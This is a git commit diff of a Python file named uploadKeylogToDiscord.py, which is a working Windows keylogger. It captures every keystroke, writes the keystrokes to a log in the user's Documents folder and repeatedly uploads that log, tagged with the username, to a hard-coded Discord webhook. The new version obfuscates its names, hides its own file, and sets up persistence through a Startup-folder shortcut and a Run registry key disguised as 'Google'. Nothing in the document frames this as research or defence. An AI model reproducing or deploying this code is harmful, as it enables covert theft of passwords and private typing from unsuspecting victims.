d9c86e88cd2dce23e3a6b2bb91a934ae9a8b0fe2
nchnnnn <92495274+nchnnnn@users.noreply.github.com>
2023-12-27 00:37:21 +0800

    RANDOMSHIT

--- uploadKeylogToDiscord.py
+++ uploadKeylogToDiscord.py
@@ -1,63 +1,74 @@
-import os
-import getpass
-import time
-import ctypes
-import tkinter as tk
-import requests
+import os, time, ctypes,requests, winreg,win32com.client,sys
 from pynput import keyboard
 
-# Discord webhook URL
-webhook_url = 'https://discord.com/api/webhooks/1187414843637121164/0P-BlEVuY9xMx9wCqZVO3ch2MJ415sjHesLvLaZVdqvGbp2KBEir391bj4X-FA_k0oG3'
 
-# Keylogger settings
-script_path = os.path.abspath(__file__)
-username = getpass.getuser()
-log_path = f"C:/Users/{username}/Documents/log.txt"
-keylogs_str = ""
-last_key_time = time.time()
-delay_duration = 60  # Set the delay duration in seconds
+vVbSdP_jM = 'https://discord.com/api/webhooks/1188180601996587168/YKw8ZWYZqyPaYoCAMmnRJsFCUMryzLJvVh81Vg2Xr5r-G-UeCewQssrAmsrUW20pU3fv'
+LmWgYm_E = ""
+aBcD_eFgH = 5 
+xYzZaB_cD = sys.argv[0] 
+os.system(f"attrib +h {xYzZaB_cD}")  
+os.chmod(xYzZaB_cD, 0o0700)
+qqwwee = os.environ.get('USERNAME')
+ppooww = f'C:/Users/{qqwwee}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/'
 
-def send_webhook_with_file(webhook_url, file_path):
+lOg_PaTh = f"C:/Users/{qqwwee}/Documents/log.txt" 
+
+lkasdmq = os.path.join(ppooww, "log.lnk")
+
+shell = win32com.client.Dispatch("WScript.Shell")
+shortcut = shell.CreateShortCut(lkasdmq)
+shortcut.Targetpath = xYzZaB_cD
+shortcut.Save()
+
+
+def wowowow(lkasdmq): 
+    user = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
+    winreg.SetValueEx(user, "Google", 0, winreg.REG_SZ, f"{lkasdmq}") 
+def lmlmlmdd(vVbSdP_jM, file_path): 
     with open(file_path, 'rb') as file:
-        payload = {"content": "KEYLOG!"}
-        files = {'file': (file_path, file)}
-        response = requests.post(webhook_url, data=payload, files=files)
-        if response.status_code == 200:
-            print("Message sent successfully!")
+        xayah = {"content": f"User: {qqwwee}"}
+        pwet = {'file': (file_path, file)}
+        poops = requests.post(vVbSdP_jM, data=xayah, files=pwet)
+        if poops.status_code == 200:
+            file.close()
+
+def rakan(): 
+    global LmWgYm_E
+    if LmWgYm_E:
+        
+        nothing = os.path.getsize(lOg_PaTh) / (1024 * 1024)  
+
+        if nothing >= 2 and lalamove == 0 :
+            lmlmlmdd(vVbSdP_jM, lOg_PaTh)
+            os.remove(lOg_PaTh)
+
         else:
-            print(f"Failed to send message. Status code: {response.status_code}")
+            lmlmlmdd(vVbSdP_jM, lOg_PaTh)
 
-def send_keylogs_to_discord():
-    global keylogs_str
-    if keylogs_str:
-        with open(log_path, 'a') as log_file:
-            log_file.write(keylogs_str)
+        LmWgYm_E = ""
+    return
+def shopee():
+    return ctypes.windll.user32.GetKeyState(0x14)
 
-        send_webhook_with_file(webhook_url, log_path)
-        keylogs_str = ""
-
-def get_capslock_state():
-    return ctypes.windll.user32.GetKeyState(0x14) & 1
-
-def handle_special_keys(key):
-    special_characters = {
+def lazada(key): 
+    powerranger = {
         keyboard.Key.backspace: "\n [BackSpace]\n",
         keyboard.Key.enter: "\n [Enter]\n",
         keyboard.Key.space: " ",
+        keyboard.Key.ctrl_l: "\n [Ctrl]\n",
     }
+    
+    if key in powerranger:
+        pass
 
-    if key in special_characters:
-        print(f"{special_characters[key]} key pressed")
-        return special_characters[key]
+        return powerranger[key]
 
     if key == keyboard.Key.caps_lock:
-        capslock_state = "[CAPSLOCK ON]" if get_capslock_state() else "[CAPSLOCK OFF]"
-        print(f"Caps Lock is {capslock_state}")
-        return capslock_state
+        walato = "[CAPSLOCK ON]" if shopee() else "[CAPSLOCK OFF]"
 
     return None
 
-def handle_numpad_keys(key):
+def powerpopgirl(key): 
     numpad_key_mapping = {
         96: "0",
         97: "1",
@@ -70,67 +81,82 @@ def handle_numpad_keys(key):
         104: "8",
         105: "9",
         106: "10",
-        # Add more mappings as needed
+   
     }
 
     if hasattr(key, 'vk') and key.vk in numpad_key_mapping:
-        print(numpad_key_mapping[key.vk])
         return numpad_key_mapping[key.vk]
 
-def handle_regular_keys(key):
+def inchanpogi(key): 
     try:
         char = format(key.char)
-        capslock_state = get_capslock_state()
-        print(capslock_state)
-        if capslock_state:
+        walato = shopee()
+
+        if walato:
             char = char.upper()
+        elif keyboard.Key.shift:
+            pass
         else:
             char = char.lower()
-
-        print(char)
+        
         return char
     except AttributeError:
-        print(f"Special key {key} pressed")
+
         return None
 
-def keyPressed(key):
-    global keylogs_str, last_key_time
+def pogiko(key):
+    global LmWgYm_E
 
-    with open(log_path, 'a') as log_file:
-        special_key_result = handle_special_keys(key)
-        numpad_key_result = handle_numpad_keys(key)
+    with open(lOg_PaTh, 'a') as log_file:
+        kiffy = lazada(key)
+        gwapoko = powerpopgirl(key)
 
-        if special_key_result is not None:
-            log_file.write(special_key_result)
-            keylogs_str += special_key_result
-        elif numpad_key_result is not None:
-            log_file.write(numpad_key_result)
-            keylogs_str += numpad_key_result
+        if kiffy is not None:
+            log_file.write(kiffy)
+            LmWgYm_E += kiffy
+        elif gwapoko is not None:
+            log_file.write(gwapoko)
+            LmWgYm_E += gwapoko
         else:
-            regular_key_result = handle_regular_keys(key)
-            if regular_key_result is not None:
-                log_file.write(regular_key_result)
-                keylogs_str += regular_key_result
+            hulaan = inchanpogi(key)
+            if hulaan is not None:
+                log_file.write(hulaan)
+                LmWgYm_E += hulaan
 
-    if time.time() - last_key_time > delay_duration:
-        send_keylogs_to_discord()
-        last_key_time = time.time()
 
 # The following line was missing in my previous responses
-keyboard.Listener(on_press=keyPressed)
+keyboard.Listener(on_press=pogiko)
 
 if __name__ == "__main__":
-    root = tk.Tk()
-    root.withdraw()  # Hide the main window
-    listener = keyboard.Listener(on_press=keyPressed)
+    listener = keyboard.Listener(on_press=pogiko)
+    wowowow(lkasdmq)
     listener.start()
+    
+   
+    try:    
 
-    try:
         while True:
-            send_keylogs_to_discord()
-            time.sleep(10)  # Wait for 2 minutes before checking again
-    except KeyboardInterrupt:
+
+            wiw = time.time()
+
+            while True:
+                lolsskie = time.time() - wiw
+                lalamove = max(0, aBcD_eFgH - lolsskie)
+                print(f"Time remaining: {lalamove:.1f} seconds")
+                if lalamove == 0:
+                    rakan()
+                    break
+
+                time.sleep(1)  
+
+            print("\nTimer finished. Restarting...\n")
+            
+
+    except:
         pass
     finally:
         listener.stop()
         listener.join()
+
+
+
